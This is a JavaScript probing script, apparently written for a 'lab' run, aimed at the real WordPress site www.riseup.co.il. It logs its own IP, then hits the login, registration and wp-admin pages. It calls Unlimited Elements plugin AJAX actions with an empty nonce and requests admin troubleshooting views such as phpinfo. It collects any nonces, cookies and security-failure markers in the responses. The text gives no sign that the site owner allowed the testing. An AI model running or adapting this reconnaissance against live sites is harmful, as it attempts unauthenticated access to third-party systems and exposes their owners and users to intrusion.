const UA='Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36';
const host='https://www.riseup.co.il';
async function req(path,method='GET',body,headers={}) {
  try {
    const opt={method,redirect:'manual',headers:{'user-agent':UA,'accept':'text/html,application/json;q=0.9,*/*;q=0.8',...headers}};
    if(body!==undefined){opt.body=body}
    const r=await fetch(host+path,opt), t=await r.text();
    const rec={path,method,status:r.status,location:r.headers.get('location'),setcookie:r.headers.get('set-cookie'),ct:r.headers.get('content-type'),len:t.length,nonce:[...t.matchAll(/g_ucNonce\s*=\s*["']([^"']+)/g)].map(x=>x[1]),markers:[...new Set((t.match(/unlimitedelements|Action security failed|access denied|registration|Register|user_login|wp-submit|uc-view-[a-z0-9_-]+/gi)||[]))].slice(0,30),body:t.slice(0,2400)};
    console.log('RES',JSON.stringify(rec));
  } catch(e){console.log('ERR',JSON.stringify({path,method,error:String(e),cause:String(e?.cause||'')}))}
}
console.log('LAB_IP',await fetch('https://api.ipify.org').then(r=>r.text()).catch(e=>'ERR:'+e));
await req('/');
await req('/wp-login.php?action=register');
await req('/wp-admin/');
const qs=[
 'action=unlimitedelements_ajax_action&client_action=show_preview',
 'action=unlimitedelements_ajax_action&client_action=show_preview&nonce=&data='+encodeURIComponent(JSON.stringify({name:'logo_marquee',addontype:'elementor'})),
 'action=unlimitedelements_ajax_action&client_action=get_addon_output_data&nonce=&data='+encodeURIComponent(JSON.stringify({name:'logo_marquee',addontype:'elementor'}))
];
for(const q of qs){await req('/wp-admin/admin-ajax.php?'+q);await req('/wp-admin/admin-ajax.php','POST',q,{'content-type':'application/x-www-form-urlencoded'})}
const views=['addons_elementor','testaddon','testaddonnew','addondefaults','troubleshooting-phpinfo','troubleshooting-showobjects'];
for(const view of views){await req('/wp-admin/admin.php?page=unlimitedelements&ucwindow=blank&view='+view+'&id=1')}
